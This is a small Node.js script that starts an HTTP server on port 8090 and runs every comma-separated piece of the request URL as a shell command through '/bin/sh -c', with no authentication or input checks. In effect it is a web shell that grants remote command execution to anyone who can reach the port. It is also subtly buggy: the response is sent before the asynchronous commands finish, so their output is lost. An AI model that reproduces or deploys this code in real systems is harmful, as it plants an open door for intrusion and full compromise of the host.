var http = require("http");
var cds = require("child_process")
var par;
var s="";
var i=0;
http.createServer(function (req, res) {
	
   s=req.url.toString();
   console.log("\033[0;37;44m");
   s=s.replace("/","");
   s=s.replace(/_/gi," ");
   console.log(s);
   par=s.split(",");

   res.writeHead(200, {'Content-Type': 'text/plain'});
   s="\r\nOK\r\n";
   for (i = 0 ; i < par.length ; i=i+1 ) {
          var w = cds.exec ( "/bin/sh -c '" + par[i] + "'" , function (err , out ,se) {
		s = s + out.toString() + "\r\n"  + se.toString() + "\r\n" ;
          });
   }
   res.end(s);
}).listen(8090);

console.log('request server');
